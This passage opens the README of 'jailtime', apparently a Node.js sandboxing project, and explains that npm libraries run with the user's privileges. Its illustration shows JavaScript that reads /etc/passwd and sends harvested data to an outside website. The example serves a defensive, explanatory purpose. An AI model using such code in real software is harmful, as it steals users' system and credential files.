# jailtime

The node ecosystem is amazing because it's very likely that there's already a lib out there that does what you want. However, it should also pretty scary to install such library because you're going to run arbitrary code with your user priviledges. Node lets you read arbitrary files, execute arbitrary external processes and connect to the internet.

For example, one could read the password files off your computer and send it to a website:

```js
require('fs').readFileSync('/etc/passwd', 'utf8');
require('child_process').execSync('cat /etc/passwd').toString();
require('http').get('http://vjeux.com/?harvest=' + getPassword());
```

Unfortunately it's 
